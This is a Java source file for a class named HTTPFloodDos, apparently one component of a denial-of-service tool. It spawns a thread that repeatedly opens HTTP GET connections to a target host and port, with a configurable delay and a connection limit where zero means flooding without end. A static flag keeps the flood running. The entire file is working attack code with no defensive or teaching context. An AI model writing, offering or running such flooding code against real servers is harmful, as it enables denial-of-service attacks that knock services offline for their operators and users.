import java.net.URL;
import java.net.HttpURLConnection;

class HTTPFloodDos extends Thread {

    private String url;
    private int delay;
    private int connections;

    private int count = 0;

    public HTTPFloodDos(String url, String port, int delay, int connections) {
        this.url = "http://" + url + ":" + port;
        this.delay = delay;
        this.connections = connections;
        this.start();
    }

    public void run() {
        while(FloodingStatus.httpFlooding && (this.count < this.connections || this.connections == 0)) {
            try {
                HttpURLConnection.setFollowRedirects(false);
                HttpURLConnection conn = (HttpURLConnection)(new URL(this.url)).openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn = null;
                count++;
            } catch(Exception e) {
            } finally {
                try {
                    Thread.sleep(this.delay);
                } catch(InterruptedException ie) {
                    ie.printStackTrace();
                }
            }
        }
    }
    static class FloodingStatus {

        public static boolean httpFlooding = true;

    }


}